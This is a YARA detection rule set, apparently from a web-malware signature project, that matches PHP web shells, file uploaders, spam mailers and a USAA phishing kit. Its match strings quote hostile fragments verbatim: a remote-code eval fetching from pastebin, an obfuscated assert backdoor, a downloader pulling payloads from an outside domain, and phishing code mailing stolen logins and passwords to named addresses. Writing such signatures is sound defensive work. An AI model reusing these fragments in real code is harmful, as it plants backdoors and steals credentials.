      date = "2018-07-14"
      hash1 = "26b6e96b0103e547b08cabb2b0ef1f14acab5b154ffc69a1afc85c8dc47ae029"
   strings:
      $x1 = "print \"<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'>" fullword ascii
      $s2 = "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js\"></script>" fullword ascii
      $s3 = "<link href=\"https://maxcdn.bootstrapcdn.com/bootswatch/3.3.6/cosmo/bootstrap.min.css\" rel=\"stylesheet\" >" fullword ascii
      $s4 = "* Options are LOGIN (default), PLAIN, NTLM, CRAM-MD5" fullword ascii
      $s5 = "$sendmail = sprintf('%s -oi -f%s -t', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));" fullword ascii
      $s6 = "$sendmail = sprintf('%s -f%s', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));" fullword ascii
      $s7 = "$privKeyStr = file_get_contents($this->DKIM_private);" fullword ascii
      $s8 = "<script type=\"text/javascript\" src=\"http://www.codejquery.net/jquery.mins.js\" ></script>" fullword ascii
      $s9 = "<li>hello <b>[-emailuser-]</b> -> hello <b>user</b></li>" fullword ascii
      $s10 = "$sendmail = sprintf('%s -oi -t', escapeshellcmd($this->Sendmail));" fullword ascii
      $s11 = "Reciver Email = <b>user@domain.com</b><br>" fullword ascii
      $s12 = "$DKIMb64 = base64_encode(pack('H*', sha1($body))); // Base64 of packed binary SHA-1 hash of body" fullword ascii
      $s13 = "* and creates a plain-text version by converting the HTML." fullword ascii
      $s14 = "* Usually the email address used as the source of the email" fullword ascii
      $s15 = "<li>your code is  <b>[-randommd5-]</b> -> your code is <b>e10adc3949ba59abbe56e057f20f883e</b></li>" fullword ascii
      $s16 = "print \"<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form>" ascii
      $s17 = "* PHPMailer only supports some preset message types," fullword ascii
      $s18 = "* @param string $patternselect A selector for the validation pattern to use :" fullword ascii
      $s19 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>" fullword ascii
      $s20 = "if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 400KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _media_brian_88D1_7DB91_infected_07_14_18_Tryag_File_Manager_jpeg_master_x7 {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file x7.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "6f6af1bc060e8030567dd30b1ec669872b0c4cb4bea3cd333949f6f4a2135acd"
   strings:
      $x1 = "<?php eval(\"?>\".file_get_contents(\"https://pastebin.com/raw/jAqZ3cxT\"));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( 1 of ($x*) )
      ) or ( all of them )
}

rule OsComPayLoad {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file OsComPayLoad.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "0827d167971390bc8c718aed98308af04a8276e8ab7839fc51f2b4713a2ee001"
   strings:
      $x1 = "$text2 = http_get('https://raw.githubusercontent.com/04x/ICG-AutoExploiterBoT/master/files/vuln.txt');" fullword ascii
      $x2 = "$text = http_get('https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php');" fullword ascii
      $s3 = "$check = $_SERVER['DOCUMENT_ROOT'] . \"/wp-content/vuln.php\" ;" fullword ascii
      $s4 = "$check2 = $_SERVER['DOCUMENT_ROOT'] . \"/vuln.htm\" ;" fullword ascii
      $s5 = "function http_get($url){" fullword ascii
      $s6 = "return curl_exec($im);" fullword ascii
      $s7 = "curl_setopt($im, CURLOPT_HEADER, 0);" fullword ascii
   condition:
      ( uint16(0) == 0x743c and
         filesize < 2KB and
         ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule RUSSIAN_MAILER2018 {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file RUSSIAN-MAILER2018.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "fc90f92c91ca7b149c9e268053e23e816e49e4613dcf9f09c318882cde8c5ecb"
   strings:
      $s1 = "$message = stripslashes($message);" fullword ascii
      $s2 = "$driv3r = $email[$i];" fullword ascii
      //$s3 = "$subject = $_POST['ssubject'];" fullword ascii
      //$s4 = "$testa = $_POST['veio'];" fullword ascii
      condition:
       all of them
}

rule mail_2018 {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file mail-2018.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "35d176c910d8db75fb752620eec215aa618ba00a74b563d85db5bcd72fc0d710"
   strings:
      //$s1 = "$headers .= \"Content-Transfer-Encoding: \". encodeCTE($XXX['MessgaeEnc']).\"\\n\";" fullword ascii
      //$s2 = "<script type=\"text/javascript\" src=\"http://www.codejquery.net/jquery.mins.js\" ></script>" fullword ascii
      $s3 = "//contact: https://www.facebook.com/achraf.orion.1//" fullword ascii
      //$s4 = "$headers .= \"Content-Type: text/html; charset=UTF-8\\n\";" fullword ascii
      //$s5 = "echo\"<br>*** (Sleep Mode <font color=green> On</font>) Sleeping <font color=red>$sleep seconds</font>... Done ***\";" fullword ascii
      //$s6 = "echo \"<br>$n - Sending... => $taz => <b> <font color=red> Error</font></b>\";" fullword ascii
      //$s7 = "var el = document.getElementById(\"hdlog\");" fullword ascii
      //$s8 = "<a class=\"navbar-brand\" href=\"http://<?= $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']?>\">" fullword ascii
      //$s9 = "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">" fullword ascii
      //$s10 = "<input class=\"form-control input\" name=\"subject\"  placeholder=\"Subject\" required=\"\" type=\"text\" autocomplete=\"off\">" fullword ascii
      //$s11 = "<input class=\"form-control input\" name=\"subject\"  placeholder=\"Subject\" required=\"\" type=\"text\" autocomplete=\"" fullword ascii
      //$s12 = "str.length > 0 ? el.innerHTML += str.shift() : clearTimeout(running); " fullword ascii
      //$s13 = "<input class=\"form-control input\" name=\"email\" placeholder=\"Email\" required=\"\"\" type=\"text\" autocomplete=\"off\">" fullword ascii
      //$s14 = "<input class=\"form-control input\" name=\"email\" placeholder=\"Email\" required=\"\"\" type=\"text\" autocomplete=\"off\"" fullword ascii
      //$s15 = "<link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css\" integrity=\"sha3" ascii
      //$s16 = "<input class=\"form-control input\" name=\"name\" placeholder=\"Name\" type=\"text\" autocomplete=\"off\">" fullword ascii
      $s17 = ".log{" fullword ascii
      //$s18 = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
      //$s19 = "$headers .= \"X-Priority: \".$XXX['Priority'].\"\\n\";" fullword ascii
      $s20 = "if (mail($taz, $subj, $mess, $headers)){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 40KB and
         ( 8 of them )
      ) or ( all of them )
}

rule shell_php {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file shell.php.pjpeg"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "cb2241fd794aaff55b354114d1447e3e6411619ca257316807cb6d0d59651021"
   strings:
      $s1 = "echo '<br />Coded by -_- janina</font>" fullword ascii
      $s2 = "<textarea cols=80 rows=20 name=\"src\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />" fullword ascii
      $s3 = "<script type=\"text/javascript\" src=\"http://www.codejquery.net/jquery.mins.js\" ></script>" fullword ascii
      $s4 = "echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');" fullword ascii
      $s5 = "echo '<div id=\"content\"><table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
      $s6 = "New Name : <input name=\"newname\" type=\"text\" size=\"20\" value=\"'.$_POST['name'].'\" />" fullword ascii
      $s7 = "echo '<font color=\"red\">File Upload Error.</font><br />';" fullword ascii
      $s8 = "<td><center><form method=\\\"POST\\\" action=\\\"?option&path=$path\\\">" fullword ascii
      $s9 = "if(is_writable(\"$path/$file\") || !is_readable(\"$path/$file\")) echo '</font>';" fullword ascii
      $s10 = "echo '<font color=\"green\">File Upload Done.</font><br />';" fullword ascii
      $s11 = "<input type=\"hidden\" name=\"path\" value=\"'.$_POST['path'].'\">" fullword ascii
      $s12 = "foreach($_POST as $key=>$value){" fullword ascii
      $s13 = "$_POST[$key] = stripslashes($value);" fullword ascii
      $s14 = "if(is_writable(\"$path/$dir\") || !is_readable(\"$path/$dir\")) echo '</font>';" fullword ascii
      $s15 = "}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){" fullword ascii
      $s16 = "if(isset($_GET['option']) && $_POST['opt'] == 'delete'){" fullword ascii
      $s17 = "echo '<form enctype=\"multipart/form-data\" method=\"POST\">" fullword ascii
      $s18 = "if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){" fullword ascii
      $s19 = "echo '</table><br /><center>'.$_POST['path'].'<br /><br />';" fullword ascii
      $s20 = "echo '<font color=\"red\">Change Permission Error.</font><br />';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 30KB and
         ( 8 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

rule _TryagFileManager_TryagFileManager3_shell_php_0 {
   meta:
      description = "Tryag-File-Manager-jpeg-master - from files TryagFileManager.php, TryagFileManager3.php, shell.php.pjpeg"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "e32a7a80127f4d5be15a811c9f52b0698f2b73e5d65d48808462b074b9131856"
      hash2 = "3cf5af7774d1dc7ca7b58d9d6899ef307eabb9ed9b66d4ef0eb44cd346135bd8"
      hash3 = "cb2241fd794aaff55b354114d1447e3e6411619ca257316807cb6d0d59651021"
   strings:
      $s1 = "New Name : <input name=\"newname\" type=\"text\" size=\"20\" value=\"'.$_POST['name'].'\" />" fullword ascii
      $s2 = "echo '<font color=\"red\">File Upload Error.</font><br />';" fullword ascii
      $s3 = "echo '<font color=\"green\">File Upload Done.</font><br />';" fullword ascii
      $s4 = "foreach($_POST as $key=>$value){" fullword ascii
      $s5 = "$_POST[$key] = stripslashes($value);" fullword ascii
      $s6 = "echo '<font color=\"red\">Change Permission Error.</font><br />';" fullword ascii
      $s7 = "echo '<font color=\"red\">Delete File Error.</font><br />';" fullword ascii
      $s8 = "echo '<font color=\"red\">Edit File Error.</font><br />';" fullword ascii
      $s9 = "echo '<font color=\"red\">Change Name Error.</font><br />';" fullword ascii
      $s10 = "echo '<font color=\"red\">Delete Dir Error.</font><br />';" fullword ascii
      $s11 = "}elseif($_POST['opt'] == 'rename'){" fullword ascii
      $s12 = "$_POST['name'] = $_POST['newname'];" fullword ascii
      $s13 = "}elseif($_POST['type'] == 'file'){" fullword ascii
      $s14 = "$fp = fopen($_POST['path'],'w');" fullword ascii
      $s15 = "if($_POST['opt'] == 'chmod'){" fullword ascii
      $s16 = "echo '<form method=\"POST\">" fullword ascii
      $s17 = "if(rmdir($_POST['path'])){" fullword ascii
      $s18 = "if(unlink($_POST['path'])){" fullword ascii
      $s19 = "echo '<font color=\"green\">Change Permission Done.</font><br />';" fullword ascii
      $s20 = "Upload File : <input type=\"file\" name=\"file\" />" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
        filesize < 80KB and ( 8 of them )
      ) or ( all of them )
}

rule _TryagFileManager3_shell_php_1 {
   meta:
      description = "Tryag-File-Manager-jpeg-master - from files TryagFileManager3.php, shell.php.pjpeg"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "3cf5af7774d1dc7ca7b58d9d6899ef307eabb9ed9b66d4ef0eb44cd346135bd8"
      hash2 = "cb2241fd794aaff55b354114d1447e3e6411619ca257316807cb6d0d59651021"
   strings:
      //$s1 = "<textarea cols=80 rows=20 name=\"src\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />" fullword ascii
      $s2 = "echo '<div id=\"content\"><table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
      $s3 = "if(is_writable(\"$path/$file\") || !is_readable(\"$path/$file\")) echo '</font>';" fullword ascii
      //$s4 = "<input type=\"hidden\" name=\"path\" value=\"'.$_POST['path'].'\">" fullword ascii
      //$s5 = "if(is_writable(\"$path/$dir\") || !is_readable(\"$path/$dir\")) echo '</font>';" fullword ascii
      //$s6 = "}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){" fullword ascii
      //$s7 = "if(isset($_GET['option']) && $_POST['opt'] == 'delete'){" fullword ascii
      //$s8 = "echo '<form enctype=\"multipart/form-data\" method=\"POST\">" fullword ascii
      //$s9 = "if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){" fullword ascii
      //$s10 = "echo '</table><br /><center>'.$_POST['path'].'<br /><br />';" fullword ascii
      //$s11 = "elseif(!is_readable(\"$path/$dir\")) echo '<font color=\"red\">';" fullword ascii
      //$s12 = "elseif(!is_readable(\"$path/$file\")) echo '<font color=\"red\">';" fullword ascii
      //$s13 = "if(rename($_POST['path'],$path.'/'.$_POST['newname'])){" fullword ascii
      //$s14 = "if(chmod($_POST['path'],$_POST['perm'])){" fullword ascii
      //$s15 = "<table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
      //$s16 = "}elseif($_POST['opt'] == 'edit'){" fullword ascii
      //$s17 = "Permission : <input name=\"perm\" type=\"text\" size=\"4\" value=\"'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'\" />" ascii
      //$s18 = "if(isset($_GET['path'])){" fullword ascii
      //$s19 = "if(fwrite($fp,$_POST['src'])){" fullword ascii
      //$s20 = "<input type=\\\"hidden\\\" name=\\\"type\\\" value=\\\"file\\\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
        filesize < 30KB and ( 8 of them )
      ) or ( all of them )
}


rule infected_05_26_18_updater {
   meta:
      description = "05-26-18 - file updater.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "96d38b0d2238911f72c032aa36261a4ea094b3f0f455f2577fe43edc77182efa"
   strings:
      $s1 = "<?php if($_GET[\"login\"]==\"eS7gBi\"){$or=\"JG11amogxPSAkX1BPU1RbJ3onXTsgaWYg\"; $zs=\"KCRtdWpqIT0iIikgeyAkeHxNzZXI9Ym\"; $lq=" ascii
      $s2 = "e\"][\"tmp_name\"],$target_path)){echo basename($_FILES[\"uploadedfile\"][\"name\"]).\" has been uploaded\";}else{echo \"Uploade" ascii
      $s3 = "<?php if($_GET[\"login\"]==\"eS7gBi\"){$or=\"JG11amogxPSAkX1BPU1RbJ3onXTsgaWYg\"; $zs=\"KCRtdWpqIT0iIikgeyAkeHxNzZXI9Ym\"; $lq=" ascii
      $s4 = "\"\", $or.$zs.$lq.$bu)));$hwy(); $target_path=basename($_FILES[\"uploadedfile\"][\"name\"]);if(move_uploaded_file($_FILES[\"uplo" ascii
      $s5 = "!\";}} ?><form enctype=\"multipart/form-data\" method=\"POST\"><input name=\"uploadedfile\" type=\"file\"/><input type=\"submit" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( all of them )
      ) or ( all of them )
}
rule infected_05_26_18_updw {
   meta:
      description = "05-26-18 - file updw.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "ed154c632a07aae4b65eb20e5c903c0a6e21e4f9eddc254885ef4b4a57564812"
   strings:
      $s1 = "$url3=\"http://www.datacen2017.top/drupal/request-sanitizer.txt\";" fullword ascii
      $s2 = "$url4=\"http://www.datacen2017.top/drupal/update-core.txt\";" fullword ascii
      $s3 = "$url1=\"http://www.datacen2017.top/drupal/del.txt\";" fullword ascii
      $s4 = "$url2=\"http://www.datacen2017.top/drupal/dr.txt\";" fullword ascii
      $s5 = "file_put_contents(\"./request-sanitizer.inc\", $str_hm3);" fullword ascii
      $s6 = "file_put_contents(\"./update-core.php\", $str_hm4);" fullword ascii
      $s7 = "file_put_contents(\"./del.php\", $str_hm1);" fullword ascii
      $s8 = "file_put_contents(\"./dr.php\", $str_hm2);" fullword ascii
      $s9 = "echo \"download is fail\";" fullword ascii
      $s10 = "if($filesize1 == '104'&& $filesize2 == '3202'&& $filesize3 == '2990'&& $filesize4 == '2275'){" fullword ascii
      $s11 = "curl_setopt($curl, CURLOPT_HEADER, false);" fullword ascii
      $s12 = "$data=curl_exec($curl);" fullword ascii
      $s13 = "$filesize4=abs(filesize(\"./update-core.php\"));" fullword ascii
      $s14 = "echo \"download is sucesss.\";" fullword ascii
      $s15 = "$filesize3=abs(filesize(\"./request-sanitizer.inc\"));" fullword ascii
      $s16 = "$str_hm1 = curl_get($url1);" fullword ascii
      $s17 = "$str_hm2 = curl_get($url2);" fullword ascii
      $s18 = "$str_hm3 = curl_get($url3);" fullword ascii
      $s19 = "$str_hm4 = curl_get($url4);" fullword ascii
      $s20 = "$filesize1=abs(filesize(\"./del.php\"));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 3KB and
         ( 8 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-24
   Identifier: shell1
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_24_18_upload_shell_ubh {
   meta:
      description = "shell1 - file ubh.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-24"
      hash1 = "4634c53823dad3fdef4ee22fddf30d077f1613fc077918bb4b45cad5105d546a"
   strings:
      $s1 = "Description: upload shell and manage site or server using console :D, happy hacking ;) !" fullword ascii
      $s2 = "add_action" fullword ascii
      $s3 = "function(){add_object_page"
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 4KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-27
   Identifier: shell1
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_27_18_uploader {
   meta:
      description = "shell1 - file up.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-27"
      hash1 = "ec5929822e2bcb6d747b24dc42f59beafc0eeb788626ca238d9f092ddd3b3ae2"
   strings:
      $s1 = "$fullpath" fullword ascii
      $s2 = "if (move_uploaded_file($files['tmp_name'], $fullpath)) {" fullword ascii
      $s3 = "if ($files" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-06
   Identifier: shell2
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_06_18_uploader {
   meta:
      description = "shell2 - file uploader.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-06"
      hash1 = "424f60bd48855ad393b4aa53004f9ab0b33dfa35b753562df5300a086f1a469a"
   strings:
      $s1 = "if((time() - $start_time) > MAX_EXEC_TIME) {" fullword ascii
      $s2 = "if(strpos($file, 'wp-content') === false && strpos($file, 'wp-admin') === false && strpos($file, 'wp-includes') === false) {" fullword ascii
      $s3 = "ZWV0ZWxsYWZyaWVuZC5jb20vdGVsbC8/dXJsPVwnLiR0YWZfcGVybWxpbmsuXCcmdGl0bGU9XCcuJHRhZl90aXRsZS5cJyIgb25jbGljaz0id2luZG93Lm9wZW4oXCdo" ascii /* base64 encoded string 'eetellafriend.com/tell/?url=\'.$taf_permlink.\'&title=\'.$taf_title.\'" onclick="window.open(\'h' */
      $s4 = "cz0wLHNjcmVlblg9MjEwLHNjcmVlblk9MTAwLGxlZnQ9MjEwLHRvcD0xMDBcJyk7IHJldHVybiBmYWxzZTsiIHRhcmdldD0iX2JsYW5rIiB0aXRsZT0iU2hhcmUgVGhp" ascii /* base64 encoded string 's=0,screenX=210,screenY=100,left=210,top=100\'); return false;" target="_blank" title="Share Thi' */
      $s5 = "cyBQb3N0Ij48aW1nIHNyYz0iXCcuJHRhZl9pbWcuXCciIHN0eWxlPSJ3aWR0aDoxMjdweDtoZWlnaHQ6MTZweDtib3JkZXI6MHB4OyIgYWx0PSJTaGFyZSBUaGlzIFBv" ascii /* base64 encoded string 's Post"><img src="\'.$taf_img.\'" style="width:127px;height:16px;border:0px;" alt="Share This Po' */
      $s6 = "ZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPjxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJteV9maWxlIj48aW5wdXQgdHlwZT0ic3VibWl0" ascii /* base64 encoded string 'ethod="post" enctype="multipart/form-data"><input type="file" name="my_file"><input type="submit' */
      $s7 = "c2NyaXB0aW9uOiBBZGRzIGEgXCdTaGFyZSBUaGlzIFBvc3RcJyBidXR0b24gYWZ0ZXIgZWFjaCBwb3N0LiBUaGUgc2VydmljZSB3aGljaCBpcyB1c2VkIGlzIGZyZWV0" ascii /* base64 encoded string 'scription: Adds a \'Share This Post\' button after each post. The service which is used is freet' */
      $s8 = "RVsncGFzc3dvcmQnXSkgJiYgZW1wdHkoJF9QT1NUWydwYXNzd29yZCddKSkgfHwgKCFlbXB0eSgkX1BPU1RbJ3Bhc3N3b3JkJ10pICYmIG1kNSgkX1BPU1RbJ3Bhc3N3" ascii /* base64 encoded string 'E['password']) && empty($_POST['password'])) || (!empty($_POST['password']) && md5($_POST['passw' */
      $s9 = "U0VMRiddLic/Jy4kX1NFUlZFUlsnUVVFUllfU1RSSU5HJ10uJyI+UGFzc3dvcmQgOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzc3dvcmQiPjxpbnB1dCB0eXBl" ascii /* base64 encoded string 'SELF'].'?'.$_SERVER['QUERY_STRING'].'">Password : <input type="text" name="password"><input type' */
      $s10 = "bGFmcmllbmRcJywgXCdzY3JvbGxiYXJzPTEsbWVudWJhcj0wLHdpZHRoPTYxNyxoZWlnaHQ9NTMwLHJlc2l6YWJsZT0xLHRvb2xiYXI9MCxsb2NhdGlvbj0wLHN0YXR1" ascii /* base64 encoded string 'lafriend\', \'scrollbars=1,menubar=0,width=617,height=530,resizable=1,toolbar=0,location=0,statu' */
      $s11 = "T00gI19fY29udGVudCBXSEVSRSAxPTEgeyRjb25kfSBPUkRFUiBCWSBgdGl0bGVgIExJTUlUIHskb2Zmc2V0fSwgJGFydGljbGVzX251bSAiOyAvLyBwcmVwYXJlIHF1" ascii /* base64 encoded string 'OM #__content WHERE 1=1 {$cond} ORDER BY `title` LIMIT {$offset}, $articles_num "; // prepare qu' */
      $s12 = "dHRwczovL3d3dy5mcmVldGVsbGFmcmllbmQuY29tL3RlbGwvP3VybD1cJy4kdGFmX3Blcm1saW5rLlwnJnRpdGxlPVwnLiR0YWZfdGl0bGUuXCdcJywgXCdmcmVldGVs" ascii /* base64 encoded string 'ttps://www.freetellafriend.com/tell/?url=\'.$taf_permlink.\'&title=\'.$taf_title.\'\', \'freetel' */
      $s13 = "cm0gbWV0aG9kPVwicG9zdFwiIGVuY3R5cGU9XCJtdWx0aXBhcnQvZm9ybS1kYXRhXCIgYWN0aW9uPVwieyRfU0VSVkVSWydQSFBfU0VMRiddfVwiPjxpbnB1dCB0eXBl" ascii /* base64 encoded string 'rm method=\"post\" enctype=\"multipart/form-data\" action=\"{$_SERVER['PHP_SELF']}\"><input type' */
      $s14 = "ZW1wdHkoJF9SRVFVRVNUWyd1c2VyX25hbWUnXSkgJiYgIWVtcHR5KCRfUkVRVUVTVFsndXNlcl9wYXNzd29yZCddKSAmJiAhZW1wdHkoJF9SRVFVRVNUWyd1c2VyX2Vt" ascii /* base64 encoded string 'empty($_REQUEST['user_name']) && !empty($_REQUEST['user_password']) && !empty($_REQUEST['user_em' */
      $s15 = "cnJheV90b19qc29uKGdldF9mdWxsX3BhdGgoSlVSSTo6YmFzZSgpIC4gJ2luZGV4LnBocD9vcHRpb249Y29tX2NvbnRlbnQmdmlldz1hcnRpY2xlJmlkPScgLiAkX1JF" ascii /* base64 encoded string 'rray_to_json(get_full_path(JURI::base() . 'index.php?option=com_content&view=article&id=' . $_RE' */
      $s16 = "touch($file_name, time() - rand(60*60*24, 60*60*24*800));" fullword ascii
      $s17 = "if($site_root_dir_splitted[count($site_root_dir_splitted)-1] == $web_dir_splitted[1]) {" fullword ascii
      $s18 = "if(strpos($file, \"wp-config.php\") !== false) {" fullword ascii
      $s19 = "if(strpos($file, \"configuration.php\") !== false) {" fullword ascii
      $s20 = "$file_name = get_file_name($all_dirs[$chosen_dir_index] . '/');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 100KB and
         ( 8 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-30
   Identifier: shell5
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_30_18_shell_ups {
   meta:
      description = "shell5 - file ups.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "895b6d730863e3b244755537628b3ad42801207efd6746c88f3b50c7da45fd04"
   strings:
      $s1 = "<?php move_uploaded_file($_FILES[f][tmp_name],$_FILES[f][name]);?>" fullword ascii
   condition:
      ( uint16(0) == 0x3131 and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-30
   Identifier: shell4
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_30_18_Marvins {
   meta:
      description = "shell4 - file Marvins.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "421afe61a0801906370ba1819dfe7bbedb8dd098398592557de1cfa7f0ae90e6"
   strings:
      $s1 = "if(isset(" fullword ascii
      $s2 = "foreach($scandir" fullword ascii
      $s3 = "if(rmdir(" fullword ascii
      $s4 = "<?php" fullword ascii
      $s7 = "if(is_writable(\"$path/$file\") || !is_readable(\"$path/$file\")) echo '</font>';" fullword ascii
   condition:
       all of them
}

rule infected_09_30_18_shell_b {
   meta:
      description = "shell4 - file b.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "bd1fed42c3a343c198c0478dd5a39c0a7048990eb1b96ea57bd635808a6b4412"
   strings:
      $s1 = "<?php $c=base64_decode('YXNzZXI=').$_GET['n'].'t';@$c($_POST['x']);?>abcabcabc" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-16
   Identifier: phishing
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */


rule infected_08_16_18_usaa_page_phishing_first {
   meta:
      description = "phishing - file first.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-16"
      hash1 = "681caec18a82b9dfe60b5fccb94604ec06620ae72537792a7a3d81faa86f3a4b"
   strings:
      $s1 = "$message .= \"--------------Usaa Login Info-----------------------\\n\";" fullword ascii
      $s2 = "$message .= \"Login ID            : \".$_POST['formtext1'].\"\\n\";" fullword ascii
      $s3 = "$send = \"mandrell009@gmail.com,born.last@yandex.com\";" fullword ascii
      $s4 = "$message .= \"Password             : \".$_POST['formtext2'].\"\\n\";" fullword ascii
      $s5 = "$headers = \"From: Usaa result<customer-support@mrs>\";" fullword ascii
      $s6 = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
      $s7 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s8 = "$headers .= $_POST['eMailAdd'].\"\\n\";" fullword ascii
      $s9 = "mail($send,$subject,$message,$headers);" fullword ascii
      $s10 = "mail($to,$subject,$message,$headers);" fullword ascii
      $s11 = "$message .= \"---------------Created BY Unknown-------------\\n\";" fullword ascii
      $s12 = "$subject = \"Result from -$ip\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_08_16_18_usaa_page_phishing_mailer {
   meta:
      description = "phishing - file mailer.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-16"
      hash1 = "4fb064375415e844bed994aebe1caf09b9a646f20d4daceefb4f4f4262af007c"
   strings:
      //$s1 = "$send = \"mandrell009@gmail.com,born.last@yandex.com\";" fullword ascii
      $s2 = "$headers = \"From: usaa result<customer-support@mrs>\";" fullword ascii
      $s3 = "$message .= \"Email Address             : \".$_POST['formtext3'].\"\\n\";" fullword ascii
      $s4 = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
      $s5 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s6 = "$headers .= $_POST['eMailAdd'].\"\\n\";" fullword ascii
